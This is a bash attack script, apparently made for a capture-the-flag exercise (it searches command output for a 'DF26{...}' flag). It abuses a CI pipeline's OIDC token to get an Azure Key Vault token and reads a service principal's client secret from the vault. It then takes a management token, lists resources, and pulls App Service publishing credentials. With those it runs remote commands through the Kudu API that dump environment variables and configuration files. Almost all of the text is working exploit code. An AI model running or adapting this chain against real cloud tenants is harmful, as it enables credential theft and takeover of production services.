#!/usr/bin/env bash
set +e
echo "=====PWN10_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
# CI -> vault token -> doc reporting-service-principal tuoi
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d grant_type=client_credentials --data-urlencode "scope=https://vault.azure.net/.default" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "vault_tok=${#VT}"
RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
echo "rid=$RID secret_len=${#RSC}"
# reporting-service -> ARM token
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "rpt_arm=${#RAT}"
echo "=== GROUPS ==="
curl -sS -m 15 -H "Authorization: Bearer $RAT" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | python3 -c 'import sys,json
for g in json.load(sys.stdin).get("value",[]): print(g["name"], g["location"])' 2>/dev/null
echo "=== RESOURCES EUS RG ==="
curl -sS -m 15 -H "Authorization: Bearer $RAT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" | python3 -c 'import sys,json
for r in json.load(sys.stdin).get("value",[]): print(r["type"], r["name"])' 2>/dev/null
echo "=== PUBLISHING CREDS ==="
for PAIR in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
  RG2=${PAIR%/*}; SITE=${PAIR#*/}
  PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2023-01-01")
  PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
  PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
  echo "[$SITE] user=${PU:-FAIL} pass_len=${#PP}"
  if [ -n "$PU" ] && [ -n "$PP" ]; then
    SCM="https://$SITE.scm.azurewebsites.net"
    for CMD in "env | sort" "cat /home/site/wwwroot/internal-config.json 2>/dev/null" "python3 -c 'import sys;sys.path.insert(0,\"/home/site/wwwroot\");from app import load_settings;print(load_settings())'"; do
      OUT=$(curl -sS -m 60 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d "$(python3 -c "import json,sys;print(json.dumps({'command':sys.argv[1],'dir':'/home/site/wwwroot'}))" "$CMD")")
      echo "--- CMD: $CMD"
      echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or d.get("Error") or "")[:2500])' 2>/dev/null
      echo "$OUT" | grep -o 'DF26{[^}]*}' | head -1
    done
  fi
done
echo "=====PWN10_END====="